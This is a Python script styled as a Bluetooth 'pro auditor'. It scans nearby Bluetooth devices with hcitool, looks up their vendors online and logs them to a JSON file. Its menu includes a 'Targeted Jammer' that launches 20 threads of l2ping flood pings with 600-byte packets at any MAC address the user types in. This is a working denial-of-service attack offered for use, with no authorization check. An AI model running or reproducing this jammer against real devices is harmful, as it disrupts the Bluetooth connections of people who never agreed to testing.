import os
import subprocess
import threading
import json
import time
import sys
import ctypes
import requests
from datetime import datetime

# Multi-Platform Admin Check
def is_admin():
    try:
        if os.name == 'nt': 
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else: 
            return os.getuid() == 0
    except:
        return False

class BlueHydraPro:
    def __init__(self):
        self.interface = "hci0"
        self.log_file = "bt_intelligence_log.json"
        self.discovered_devices = {}
        self.stop_event = threading.Event()
        self.is_windows = os.name == 'nt'
        
        # Load Logs
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r') as f:
                self.discovered_devices = json.load(f)
        
        # Windows Testing ke liye fake data
        if self.is_windows and not self.discovered_devices:
            self.discovered_devices = {
                "00:25:96:FF:EE:12": {"vendor": "Apple (Test)", "rssi": -42, "first_seen": "12:00:01"},
                "60:AB:D2:34:11:98": {"vendor": "Samsung (Test)", "rssi": -65, "first_seen": "12:05:22"}
            }

    def get_vendor(self, mac):
        try:
            res = requests.get(f"https://api.macvendors.com/{mac}", timeout=1.5)
            return res.text if res.status_code == 200 else "Unknown Vendor"
        except: return "Bluetooth Device"

    def scan_engine(self):
        """Background Scanner logic."""
        while True:
            if not self.is_windows:
                try:
                    proc = subprocess.run(["hcitool", "inq"], capture_output=True, text=True)
                    for line in proc.stdout.splitlines():
                        if ":" in line:
                            parts = line.split()
                            mac = parts[0]
                            if mac not in self.discovered_devices:
                                self.discovered_devices[mac] = {
                                    "vendor": self.get_vendor(mac),
                                    "first_seen": datetime.now().strftime("%H:%M:%S")
                                }
                except: pass
            time.sleep(5)

    def jam_worker(self, target):
        """Jamming logic (Kali only)."""
        while not self.stop_event.is_set():
            if self.is_windows:
                print(f"\n[SIMULATION] Blasting 600-byte packets at {target}...")
                time.sleep(2)
            else:
                try:
                    subprocess.run(["l2ping", "-i", self.interface, "-s", "600", "-f", "-c", "1", target],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except: pass

    def menu(self):
        threading.Thread(target=self.scan_engine, daemon=True).start()
        while True:
            os.system('cls' if self.is_windows else 'clear')
            print("\x1b[36m" + r"""
     ____  _            _   _           _             
    | __ )| |_   _  ___| | | |_   _  __| |_ __ __ _ 
    |  _ \| | | | |/ _ \ |_| | | | |/ _` | '__/ _` |
    | |_) | | |_| |  __/  _  | |_| | (_| | | | (_| |
    |____/|_|\__,_|\___|_| |_|\__, |\__,_|_|  \__,_|
                              |___/   PRO AUDITOR
            """ + "\x1b[0m")
            print(f"OS: {'Windows (Test Mode)' if self.is_windows else 'Linux (Full Mode)'}")
            print(f"Targets Found: {len(self.discovered_devices)}")
            print("\n1. Show All Devices\n2. Targeted Jammer (Manual Stop)\n3. Exit")
            
            choice = input("\nSelection > ")
            
            if choice == "1":
                print("\nMAC ADDRESS          VENDOR               FIRST SEEN")
                print("-" * 60)
                for mac, data in self.discovered_devices.items():
                    print(f"{mac:<20} {data['vendor'][:20]:<20} {data['first_seen']}")
                input("\nPress Enter...")

            elif choice == "2":
                target = input("Enter Target MAC > ")
                self.stop_event.clear()
                for _ in range(20):
                    threading.Thread(target=self.jam_worker, args=(target,), daemon=True).start()
                input("[!] JAMMING... Press ENTER to Stop.")
                self.stop_event.set()

            elif choice == "3": sys.exit(0)

if __name__ == "__main__":
    auditor = BlueHydraPro()
    auditor.menu()